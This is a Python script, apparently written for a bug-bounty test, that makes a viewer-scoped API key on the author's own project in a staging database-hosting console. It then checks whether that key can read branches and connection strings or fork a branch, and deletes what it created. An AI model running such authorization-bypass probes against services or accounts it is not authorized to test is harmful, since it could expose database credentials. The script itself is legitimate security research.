# -*- coding: utf-8 -*-
"""Role experiment: can a Viewer-scoped credential fork branches / see connection strings?
Strategy: create a per-project API key with viewer permission (Aug-2026 permission model),
then test the anonymized-branch bypass chain under that lowest credential.
Zero-destruction: own project, temp key deleted at the end.
"""
import json
import time
import ssl
import http.client

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    MAINKEY = json.load(fh)["key"]

LOG = r"F:\scan\neon_report\_u17_out.txt"


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def call(method, path, body=None, key=MAINKEY, timeout=40):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + key)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


# ---- 0. inspect existing api keys (shape of the new permission model) ----
out("=== step0 list api_keys ===")
st, d = call("GET", "/api_keys")
out("list: %s %s" % (st, d[:800]))

# ---- 1. create viewer-scoped key (try shapes) ----
out("\n=== step1 create viewer-scoped key ===")
VKEY = None
CANDIDATES = [
    {"key_name": "u17-viewer-a", "scope": {"project_id": PA, "permission": "viewer"}},
    {"key_name": "u17-viewer-b", "scope": {"project_id": PA, "role": "viewer"}},
    {"key_name": "u17-viewer-c", "permission": "viewer"},
    {"key_name": "u17-viewer-d", "scope": {"project_id": PA}},
]
for c in CANDIDATES:
    st, d = call("POST", "/api_keys", c)
    out("create %s: %s %s" % (c.get("key_name"), st, d[:500]))
    if st in (200, 201):
        try:
            j = json.loads(d)
            VKEY = j.get("key") or (j.get("api_key", {}) or {}).get("key")
            if not VKEY and isinstance(j, dict):
                VKEY = j.get("id")
            out("VIEWER KEY acquired: %s" % (VKEY if not isinstance(VKEY, dict) else json.dumps(VKEY)[:100]))
            break
        except Exception as e:
            out("parse err %s" % e)
    if st == 400:
        # decode error gives the schema hint
        try:
            e = json.loads(d)
            out("   hint: %s" % e.get("message", "")[:300])
        except Exception:
            pass

if not VKEY:
    out("!! could not create viewer key - abort")
    raise SystemExit

# if VKEY is a dict (full object), extract actual secret field
if isinstance(VKEY, dict):
    VKEY = VKEY.get("key") or VKEY.get("secret_key") or ""

out("\n=== step2 probes under viewer key ===")
st, d = call("GET", "/projects/%s/branches" % PA, key=VKEY)
out("viewer GET branches: %s" % st)
st, d = call("GET", "/projects/%s/branches/%s" % (PA, "br-wandering-field-w2ob6mpn"), key=VKEY)
out("viewer GET main branch: %s %s" % (st, d[:150]))
st, d = call("GET", "/projects/%s/branches/main/connection_uri" % PA, key=VKEY)
out("viewer GET connection_uri(main): %s %s" % (st, d[:150]))
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u17-vfork", "parent_id": "br-wandering-field-w2ob6mpn"}},
             key=VKEY, timeout=60)
out("viewer POST fork: %s %s" % (st, d[:400]))
if st in (200, 201):
    j = json.loads(d)
    nb = j.get("branch", {}).get("id")
    has_uri = "connection_uris" in j or "connection_uri" in json.dumps(j)
    out("viewer fork SUCCESS id=%s has_conn=%s" % (nb, has_uri))
    # cleanup via main key
    if nb:
        st2, d2 = call("DELETE", "/projects/%s/branches/%s" % (PA, nb))
        out("cleanup fork: %s %s" % (st2, d2[:150]))

# ---- 3. delete viewer key ----
out("\n=== step3 cleanup ===")
if VKEY and len(str(VKEY)) < 40:
    st, d = call("DELETE", "/api_keys/%s" % VKEY)
    out("del viewer key: %s %s" % (st, d[:200]))
else:
    # find by name and delete
    st, d = call("GET", "/api_keys")
    try:
        for k in json.loads(d).get("api_keys", []):
            if k.get("name", "").startswith("u17-"):
                st2, d2 = call("DELETE", "/api_keys/%s" % k["id"])
                out("del key %s (%s): %s" % (k["name"], k["id"], st2))
    except Exception:
        pass
out("== DONE")
